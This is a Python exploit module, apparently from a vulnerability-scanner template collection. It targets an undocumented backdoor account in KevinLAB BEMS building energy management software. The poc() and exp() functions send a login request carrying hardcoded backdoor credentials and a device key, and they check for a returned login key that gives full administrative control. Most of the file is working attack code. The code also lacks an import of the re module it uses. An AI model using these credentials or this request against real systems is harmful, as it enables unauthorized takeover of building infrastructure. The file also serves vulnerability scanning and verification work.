import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''KevinLAB BEMS (Building Energy Management System) Undocumented Backdoor Account''',
        "description": '''The BEMS solution has an undocumented backdoor account, and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel, and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the BEMS is offering remotely.''',
        "severity": "critical",
        "references": [
            "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["kevinlab", "backdoor"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/http/index.php"""
        method = "POST"
        data = """requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22kevinlab%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22kevin003%22%7D%2C%7B%22name%22%3A%22device_key%22%2C%22value%22%3A%22a2fe6b53-e09d-46df-8c9a-e666430e163e%22%7D%2C%7B%22name%22%3A%22auto_login%22%2C%22value%22%3Afalse%7D%2C%7B%22name%22%3A%22login_key%22%2C%22value%22%3A%22%22%7D%5D"""
        headers = {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""data":"[A-Za-z0-9-]+""",resp0.text) or re.search(r"""login_key":"[A-Za-z0-9-]+""",resp0.text)) and ("""result":true""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url